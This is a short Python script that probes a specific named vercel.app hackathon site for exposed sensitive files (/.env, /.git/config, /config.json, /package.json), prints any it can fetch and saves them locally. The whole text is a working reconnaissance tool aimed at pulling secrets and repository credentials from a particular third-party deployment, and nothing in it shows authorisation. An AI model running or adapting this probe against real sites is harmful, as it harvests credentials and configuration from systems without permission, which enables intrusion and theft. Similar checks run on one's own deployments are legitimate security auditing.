import requests

BASE_URL = "https://smartkopargaonhackathon.vercel.app"
session = requests.Session()

files_to_check = ["/.env", "/.git/config", "/config.json", "/package.json"]

for file in files_to_check:
    print(f"\n{'='*70}")
    print(f"FILE: {file}")
    print('='*70)
    try:
        r = session.get(f"{BASE_URL}{file}", timeout=5)
        if r.status_code == 200:
            print(r.text[:1000])
            with open(f"sk_exposed{file.replace('/', '_')}", "w", encoding="utf-8") as f:
                f.write(r.text)
    except Exception as e:
        print(f"Error: {e}")
